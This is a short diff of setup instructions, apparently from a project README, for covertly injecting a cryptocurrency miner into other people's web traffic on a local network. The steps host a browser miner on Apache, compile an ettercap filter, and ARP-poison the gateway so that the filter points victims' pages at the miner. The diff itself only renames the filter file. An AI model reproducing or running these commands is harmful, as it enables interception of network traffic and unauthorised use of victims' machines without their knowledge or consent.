@@ -12,9 +12,9 @@ cd stratum-mining-proxy && distribute_setup.py; chmod u+x setup.py; ./setup.py d
 move lm to your apache directory.
 cp lm /var/www/html -R
 /etc/init.d/apache2 restart
-etterfilter nethash.etterfilter -o nh.ef
+etterfilter hashnet.etterfilter -o nh.ef
 ettercap -T -M arp:remote -q -F nh.ef /192.168.0.1/ //
-CHANGE nethash.etterfilter file's ip in the perl script section to point to the webserver where you host the miner.
+CHANGE hashnet.etterfilter file's ip in the perl script section to point to the webserver where you host the miner.
 
 Test it by going to 127.0.0.1/lm
 
